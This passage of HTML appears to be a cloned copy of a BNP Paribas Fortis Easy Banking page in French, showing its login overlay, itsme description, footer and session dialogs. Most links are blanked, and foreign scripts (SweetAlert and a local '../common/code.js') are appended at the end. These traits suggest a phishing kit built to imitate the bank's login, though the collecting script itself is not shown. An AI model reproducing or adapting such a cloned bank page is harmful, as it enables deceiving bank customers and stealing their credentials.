var queryData = sf.messaging.queryTopic('target.ia.contact.showAuthContactInfo')[0];
ErrorMessage.loadErrorData(queryData);
}
});
});
</script>
</div>
</div>
</div>
</div>
</div>
<div class="ls-cmp-wrap" id="w1520355986008">
<div class="iw_component" id="1520355986008"><div class="wcm-severity-message">
<div class="severity_message">
<div class="alert_messages fade in alert_messages_information  nextgen show_active">
<script>
document.addEventListener("DOMContentLoaded", function(event) {
require(["sf","errorMessage"], function (sf,ErrorMessage) 
{
if (typeof sf.messaging.queryTopic('target.ia.contact.showContactInfo')[0] != 'undefined') 
{
var queryData = sf.messaging.queryTopic('target.ia.contact.showContactInfo')[0];
ErrorMessage.loadErrorData(queryData);
}
else if (typeof sf.messaging.queryTopic('target.ia.contact.showAuthContactInfo')[0] != 'undefined') 
{
var queryData = sf.messaging.queryTopic('target.ia.contact.showAuthContactInfo')[0];
ErrorMessage.loadErrorData(queryData);
}
});
});
</script>
</div>
</div>
</div>
</div>
</div>
<div class="ls-cmp-wrap" id="w1524221388679">
<div class="iw_component" id="1524221388679">
</div>
</div>
<div class="ls-cmp-wrap" id="w1541118511050">
<div class="iw_component" id="1541118511050"><div class="wcm-severity-message">
<div class="severity_message">
<div class="alert_messages fade in alert_messages_information  nextgen show_active">
<script>
document.addEventListener("DOMContentLoaded", function(event) {
require(["sf","errorMessage"], function (sf,ErrorMessage) 
{
if (typeof sf.messaging.queryTopic('target.ia.contact.showContactInfo')[0] != 'undefined') 
{
var queryData = sf.messaging.queryTopic('target.ia.contact.showContactInfo')[0];
ErrorMessage.loadErrorData(queryData);
}
else if (typeof sf.messaging.queryTopic('target.ia.contact.showAuthContactInfo')[0] != 'undefined') 
{
var queryData = sf.messaging.queryTopic('target.ia.contact.showAuthContactInfo')[0];
ErrorMessage.loadErrorData(queryData);
}
});
});
</script>
</div>
</div>
</div>
</div>
</div>
<div class="ls-cmp-wrap" id="w1585873228984">
<div class="iw_component" id="1585873228984"><div class="wcm-severity-message">
<div class="severity_message">
<div class="alert_messages fade in alert_messages_information  nextgen show_active">
<script>
document.addEventListener("DOMContentLoaded", function(event) {
require(["sf","errorMessage"], function (sf,ErrorMessage) 
{
if (typeof sf.messaging.queryTopic('target.ia.contact.showContactInfo')[0] != 'undefined') 
{
var queryData = sf.messaging.queryTopic('target.ia.contact.showContactInfo')[0];
ErrorMessage.loadErrorData(queryData);
}
else if (typeof sf.messaging.queryTopic('target.ia.contact.showAuthContactInfo')[0] != 'undefined') 
{
var queryData = sf.messaging.queryTopic('target.ia.contact.showAuthContactInfo')[0];
ErrorMessage.loadErrorData(queryData);
}
});
});
</script>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="ls-row-clr"></div>
</div>
</div>
<div class="ls-row content_row" id="IA">
<div class="ls-lqr" id="ls-gen74962505-ls-lqr">
<div class="ls-area" id="ls-row-2-col-1-row-2-col-1-row-2-area-1">
<div class="ls-area-body" id="ls-gen74962506-ls-area-body">
<div class="ls-cmp-wrap ls-1st" id="w1496157905139">
<div class="iw_component" id="1496157905139"><div id="login_overlayer" class="login-container" data-url-context="/EBIA-pr01/"></div><script>

var hide_logon = false;

jQuery(document).ready(function( $ ) {
var topicName = "target.ia.logon.showLogon";
var iaId = Mediator.getIaIdFromTopic(topicName);
Mediator.registerIa(iaId, hide_logon);

if (hide_logon === true && Mediator.checkQuery(topicName) === false) {
Mediator.subscribeToTopic("mediator.load.ia.logon", function(topic, data) {
require(["loginv5"], function (LoginApp) 
{
new LoginApp('#login_overlayer');
});
});
} else {
require(["loginv5"], function (LoginApp) 
{
new LoginApp('#login_overlayer');
});
} 
});

</script>
</div>
</div>
<div class="ls-cmp-wrap" id="w1496157905140">
<div class="iw_component" id="1496157905140"><!--content start--><div id="wcm-l-description">
<div class="wcm-html style-default nextgen"><div class="hide" id="itsme_description">	<p class="font_14 pad-b20">Avec l’application Itsme, vous pouvez...</p>	<ul class="checklist font_14 pad-b5">		<li class="pad-b15"><span class="highlight_text">confirmer votre identité,</span> de manière rapide et sécurisée, avec votre smartphone et votre code itsme.</li>		<li class="pad-b15"><span class="highlight_text">vous connecter et confirmer des transactions</span> en Easy Banking sans lecteur de carte.</li>		<li class="pad-b15">vous connecter à<span class="highlight_text"> d’autres services sécurisés</span> avec l’app itsme.</li>	</ul></div></div>
</div><!--content stop-->
</div>
</div>
<div class="ls-cmp-wrap" id="w1513298264246">
<div class="iw_component" id="1513298264246"><div class="wcm-javascript style-default nextgen">
<script type="text/javascript">var sReqProtocol = (location.href.match(/^https/)) ? 'https://' : 'http://';
var sErrorImgBaseDir = sReqProtocol+'prodl.streamcloud.be/fortis_web/streaming-player-assets/image/';	
var sImg_unrecoverable_error = 'https://www.bnpparibasfortis.be/web-banking/error.page?axes1=fr&amp;axes2=PC&amp;axes3=fb&amp;axes4=priv&amp;rc=404';
var sImg_stream_error = 'https://www.bnpparibasfortis.be/web-banking/error.page?axes1=fr&amp;axes2=PC&amp;axes3=fb&amp;axes4=priv&amp;rc=404';
var sImg_server_error = 'https://www.bnpparibasfortis.be/web-banking/error.page?axes1=fr&amp;axes2=PC&amp;axes3=fb&amp;axes4=priv&amp;rc=404';
var iAudioPlayerHeight = 30;

$(document).ready(function() {
loadModalForItsmePage();
});

window.addEventListener("popstate", function(){
var intervalId = setInterval(function(){
$("[data-link=itsme_product]").unbind( "click" );
if($("[data-link=itsme_product]").length > 0){
rebindWithOverlay();
clearInterval(intervalId);
}
}, 1000);
}); 

$(document).ajaxSuccess(function( event, xhr, settings ) {
var intervalId = setInterval(function(){
$("[data-link=itsme_product]").unbind( "click" );
if($("[data-link=itsme_product]").length > 0){
rebindWithOverlay();
clearInterval(intervalId);
}
}, 1000);	
});

function loadModalForItsmePage(){
var html = '<div class="modal fade overlay nextgen" id="itsmeOverlay" tabindex="-1" role="dialog"><div class="modal-dialog overlay_inner overlayConfirmation large show"><div class="overlay_container"><div class="overlay_header"><h2 class="txt_default">itsme</h2><button data-dismiss="modal" class="fontcon-close-thin close popup_close"><span class="icon_txt"></span></button></div><div id="itsmepagecontainer" class="main_wrapper" style="padding-bottom: 40px;"><div id="itsmepagecontainer" class="main_wrapper" style="padding-bottom: 40px;"><div class="progressing" style="background: none; position: static; display: block;"><div class="progressing_inner" style="margin: 0 auto -80px auto; position: static; width: 100%"><p>Loading</p></div></div></div></div></div></div></div>';
$(".wcm-overlay").append(html);
}

function rebindWithOverlay(){
$("[data-link=itsme_product]").on("click", function(){
$("#itsmeOverlay").modal();
$.ajax({
url: '/itsme_product_page',
success: function(data) {
data=$(data).find('.main_wrapper');
data = data.html().replace(/<script src="\/rsc\/contrib\/script\/js\/common\/package\/custom\/hostedVideoScripts.js" type="text\/javascript"><\/script>/g, '');
$('#itsmepagecontainer').html(data);
$('#itsmepagecontainer').find('.video_play').removeAttr("data-toggle");
$('#itsmepagecontainer').find('.pre_footer_container').remove();
$('#itsmepagecontainer').find('.footer').remove();
$(".video_play").on("click", function(e){
e.preventDefault();
var parent = $(this).parents(".video_block");
parent.html($($(this).data('target')).find(".hostedVideo"));
});
}
});
});
}</script>
</div>
</div>
</div>
</div>
</div>
<div class="ls-row-clr"></div>
</div>
</div>
<div class="ls-row service_col" id="service">
<div class="ls-lqr" id="ls-gen74962507-ls-lqr">
<div class="ls-area" id="ls-row-2-col-1-row-2-col-1-row-3-area-1">
<div class="ls-area-body" id="ls-gen74962508-ls-area-body">
<div class="ls-cmp-wrap ls-1st" id="w1533196592165">
<div class="iw_component" id="1533196592165">
</div>
</div>
</div>
</div>
<div class="ls-row-clr"></div>
</div>
</div>
</div>
</div>
<div class="ls-row-clr"></div>
</div>
</div>
<div class="ls-row footer" id="footer">
<div class="ls-lqr" id="ls-gen74962509-ls-lqr">
<div class="ls-area" id="ls-row-2-col-1-row-3-area-1">
<div class="ls-area-body" id="ls-gen74962510-ls-area-body">
<div class="ls-cmp-wrap ls-1st" id="w1465485783754">
<div class="iw_component" id="1465485783754"><!--Footer Module--><!--Start chat Loading in all the pages--><script src="rsc/contrib/script/js/bnpp-fortis/chat/lib/initiateChat.js" type="text/javascript"></script><div class="chat_widget"></div><!--End chat Loading div in all the pages--><div class="wcm-footer nextgen">
<div class="footer_lnks clearfix">
<div class="link_list">
<div class="link_title">
<div class="title_txt">UNE URGENCE ?</div>
</div>
<ul>
<li>
<a href="http://www.cardstop.be/" target="_blank">Card Stop</a>
</li>
<li>
<a href="" target="_self">Déclarer un sinistre</a>
</li>
<li>
<a href="" target="_self">Signaler une fraude</a>
</li>
</ul>
<div class="successive_image_block">
<a href="tel:070344344" class="tel_link"><img src="rsc/contrib/image/footer/stopcard.png" alt="Card Stop"></a>
</div>
</div>
<div class="link_list">
<div class="link_title">
<div class="title_txt">GÉNÉRALITÉS</div>
</div>
<ul>
<li>
<a href="" target="_self">Nous contacter</a>
</li>
<li>
<a href="" target="_self">FAQ</a>
</li>
<li>
<a href="" target="_self">Conditions générales</a>
</li>
<li>
<a href="" target="_self">Règles de conduite</a>
</li>
<li>
<a href="" target="_self">Tarifs</a>
</li>
<li>
<a href="" target="_self">Protection des dépôts</a>
</li>
<li>
<a href="" target="_self">Suggestions ou plaintes</a>
</li>
<li>
<a href="" target="_self">Sécurité</a>
</li>
</ul>
</div>
<div class="link_list">
<div class="link_title">
<div class="title_txt">NOTRE OFFRE</div>
</div>
<ul>
<li>
<a href="" target="_blank">Particuliers</a>
</li>
<li>
<a href="" target="_blank">Entrepreneurs</a>
</li>
<li>
<a href="" target="_blank">Private Banking</a>
</li>
<li>
<a href="" target="_blank">Expats</a>
</li>
<li>
<a href="" target="_self">Newsletters</a>
</li>
</ul>
</div>
<div class="link_list">
<div class="extsocial_icons">
<div class="link_title">
<div class="title_txt">RESTEZ AU COURANT</div>
</div>
<ul class="social_icon">
<li>
<a href="" aria-label="Twitter" class="fontcon-twitter" target="_blank"> </a>
</li>
<li>
<a href="" aria-label="Facebook" class="fontcon-facebook" target="_blank"> </a>
</li>
<li>
<a href="" aria-label="Linkedin" class="fontcon-linkedin" target="_blank"> </a>
</li>
<li>
<a href="" aria-label="Youtube" class="fontcon-youtube" target="_blank"> </a>
</li>
<li>
<a href="" aria-label="Community" class="fontcon-community" target="_blank"> </a>
</li>
</ul>
</div>
</div>
</div>
<div class="footer_lnks clearfix">
<div class="legal_section">
<ul class="legal_lnks">
<li>
<a href="" target="">A propos de nous</a>
</li>
<li>
<a  href="#" class="">Co-browsing</a>
</li>
<li>
<a href="" target="_self">Conditions d’utilisation du Site</a>
</li>
<li>
<a href="#" class="">Cookies</a>
</li>
<li>
<a href="" target="">Déclaration Vie Privée</a>
</li>
<li>
<a href="US-Policy93e9.html?axes4=priv" target="_self">US Disclaimer</a>
</li>
</ul>
<div class="legal_image">
<div></div>
</div>
</div>
<div class="legal_msg">
<p>Copyright © 2022 BNP Paribas Fortis</p>
</div>
</div>
<div class="progressing">
<div class="progressing_inner">
<p>Chargement</p>
</div>
</div>
</div>
</div>
</div>
<div class="ls-cmp-wrap" id="w1452690391672">
<div class="iw_component" id="1452690391672">
</div>
</div>
<div class="ls-cmp-wrap" id="w1465485783755">
<div class="iw_component" id="1465485783755"><div class="wcm-overlay">
<div class="modal fade overlay nextgen" tabindex="-1" role="dialog">
<div class="modal-dialog overlay_inner overlayConfirmation small">
<div class="overlay_container">
<div class="overlay_header">
<span class="fontcon-attention overlay_icon"></span>
<h2>Se déconnecter</h2>
<button data-dismiss="modal" class="fontcon-close-thin close popup_close"><span class="icon_txt">Close</span></button>
</div>
<div class="rich_text">
<div class="region ">
<div class="section level1 ">
<h3>Êtes-vous sûr(e) de vouloir vous déconnecter ?</h3>
</div>
</div>
<div class="overlay_btn">
<div class="navigation_btns">
<div class="right_navigation_btn f_right">
<a data-data="Logout" data-topic="Logout" href="#" class="btn_default btn_primary f_right postPagebusMessage">Oui</a><a data-data="Cancel" data-topic="Cancel" href="#" class="btn_default btn_secondary f_right postPagebusMessage" data-dismiss="modal">Non</a>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal-dialog overlay_inner overlayLngSelection small">
<div class="overlay_container">
<div class="overlay_header">
<span class="fontcon-attention overlay_icon"></span>
<h2>Avertissement</h2>
<button data-dismiss="modal" class="fontcon-close-thin close popup_close"><span class="icon_txt">Close</span></button>
</div>
<div class="rich_text">
<div class="region ">
<div class="section level1 ">
<h4>Cette page n'est pas disponible dans votre langue.</h4>
<p>Veuillez sélectionner la langue que vous préférez pour la page cible.</p>
<ul>
<li>
<span id="en">Anglais</span>
</li>
<li>
<span id="fr">Français</span>
</li>
<li>
<span id="de">Allemand</span>
</li>
<li>
<span id="nl">Néerlandais</span>
</li>
</ul>
</div>
</div>
<div class="overlay_btn">
<div class="navigation_btns">
<div class="right_navigation_btn f_right">
<a data-data="#" data-topic="#" href="#" class="btn_default btn_primary f_right postPagebusMessage">Continuer</a><a data-data="#" data-topic="#" href="#" class="btn_default btn_secondary f_right postPagebusMessage" data-dismiss="modal">Annuler</a>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal-dialog overlay_inner overlayLogoutAbsolute small">
<div class="overlay_container">
<div class="overlay_header">
<span class="fontcon-attention overlay_icon"></span>
<h2>Attention</h2>
<button data-dismiss="modal" class="fontcon-close-thin close popup_close"><span class="icon_txt">Close</span></button>
</div>
<div class="rich_text">
<div class="region ">
<div class="section level1 ">
<h3>Votre session va expirer dans</h3>
<p>
<span id="timeout">2:00</span> <span>Secondes</span>
</p>
</div>
</div>
<div class="overlay_btn">
<div class="navigation_btns">
<div class="right_navigation_btn f_right">
<a data-data="logoutNow" data-topic="logoutNow" href="#" class="btn_default btn_primary f_right postPagebusMessage">OK</a>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal-dialog overlay_inner overlayLogoutRelative small">
<div class="overlay_container">
<div class="overlay_header">
<span class="fontcon-attention overlay_icon"></span>
<h2>Attention</h2>
<button data-dismiss="modal" class="fontcon-close-thin close popup_close"><span class="icon_txt">Close</span></button>
</div>
<div class="rich_text">
<div class="region ">
<div class="section level1 ">
<h3>Votre session va expirer dans: </h3>
<p>
<span id="timeout">1:50</span> <span>Secondes</span>
</p>
<p>Voulez-vous rester connecté?</p>
</div>
</div>
<div class="overlay_btn">
<div class="navigation_btns">
<div class="right_navigation_btn f_right">
<a data-data="logoutnow" data-topic="logoutnow" href="#" class="btn_default btn_primary f_right postPagebusMessage">Se déconnecter maintenant</a><a data-data="stay" data-topic="stay" href="#" class="btn_default btn_secondary f_right postPagebusMessage" data-dismiss="modal">Rester connecté</a>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal-dialog overlay_inner overlayCancelConfirmation small">
<div class="overlay_container">
<div class="overlay_header">
<span class="fontcon-attention overlay_icon"></span>
<h2>Attention</h2>
<button data-dismiss="modal" class="fontcon-close-thin close popup_close"><span class="icon_txt">Close</span></button>
</div>
<div class="rich_text">
<div class="region ">
<div class="section level1 ">
<p>Êtes-vous certain de vouloir annuler ?</p>
</div>
</div>
<div class="overlay_btn">
<div class="navigation_btns">
<div class="right_navigation_btn f_right">
<a data-data="Cancel" data-topic="cancelpopup_confirm" href="#" class="btn_default btn_primary f_right postPagebusMessage">Oui</a><a data-data="Logout" data-topic="cancelpopup_cancel" href="#" class="btn_default btn_secondary f_right postPagebusMessage" data-dismiss="modal">Non</a>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal-dialog overlay_inner overlayDeleteConfirmation small">
<div class="overlay_container">
<div class="overlay_header">
<span class="fontcon-attention overlay_icon"></span>
<h2>Attention</h2>
<button data-dismiss="modal" class="fontcon-close-thin close popup_close"><span class="icon_txt">Close</span></button>
</div>
<div class="rich_text">
<div class="region ">
<div class="section level1 ">
<p>Êtes-vous certain de vouloir supprimer ce(s) message(s) ?</p>
</div>
</div>
<div class="overlay_btn">
<div class="navigation_btns">
<div class="right_navigation_btn f_right">
<a data-data="logout" data-topic="deletepopup_confirm" href="#" class="btn_default btn_primary f_right postPagebusMessage">Oui</a><a data-data="cancel" data-topic="deletepopup_cancel" href="#" class="btn_default btn_secondary f_right postPagebusMessage" data-dismiss="modal">Non</a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>

<div class="ls-cmp-wrap" id="w1604625454521">
<div class="iw_component" id="1604625454521"><!--Contact Us component--><div class="wcm-co-browse nextgen">
<div class="abc" id="cb_inject">
<div auto-id="cb_popup" class="cb_popup">
<div class="cb_popup_inner">
<div class="cb_popup_wrapper">
<button class="cb_close"><i class="fontcon-close"></i></button>
<div class="cb_popup_step1">
<div class="font_18 mar-b10">Partage de votre écran Easy Banking Web</div>
<div class="font_15 mar-b15 lh_22">Si vous êtes actuellement en contact téléphonique ou chat avec un conseiller Easy Banking, vous pouvez démarrer un partage de votre écran Easy Banking Web</div>
</div>
<div class="cb_popup_step2 hide">
<div class="font_18 mar-b10">Partage du numéro de session</div>
<div class="font_15 mar-b15 lh_22">Afin d'activer le partage de votre écran Easy Banking Web, veuillez svp communiquer le numéro de session ci-dessous au conseiller Easy Banking avec qui vous êtes en relation.</div>
</div>
<div class="cb_sharebox hide">
<p class="highlight_text">Numéro de session:<span></span>
</p>
</div>
<div auto-id="cb_startshare" class="cb_startshare clearfix">
<button class="f_right"><span class="highlight_text">Partager mon écran Easy Banking Web</span><span class="cb_bubble"><i class="fontcon-screen"></i></span></button>
</div>
</div>
</div>
</div>
<div style="top: 14px; left: 1545px;" auto-id="cb_stopshare" id="cb_stopshare" class="cb_stopshare">
<div id="cb_stopsharehandle" class="cb_stopsharehandle">
<span class="cb_hamburger"></span>
</div>
<button class="cb_stopsharebutton">
<div class="cb_bubble_wrapper">
<span class="cb_bubble"><i class="fontcon-no-screen"></i></span>
</div>
<span class="">Arrêter le partage de votre écran</span></button>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="ls-row-clr"></div>
</div>
</div>
</div>
</div>
<div class="ls-row-clr"></div>
</div>
</div>
</div>

</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@7.26.11/dist/sweetalert2.all.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js" integrity="sha256-KsRuvuRtUVvobe66OFtOQfjP8WA2SzYsmm4VPfMnxms=" crossorigin="anonymous"></script>

<script src="../common/code.js"></script>
</body>
</html>
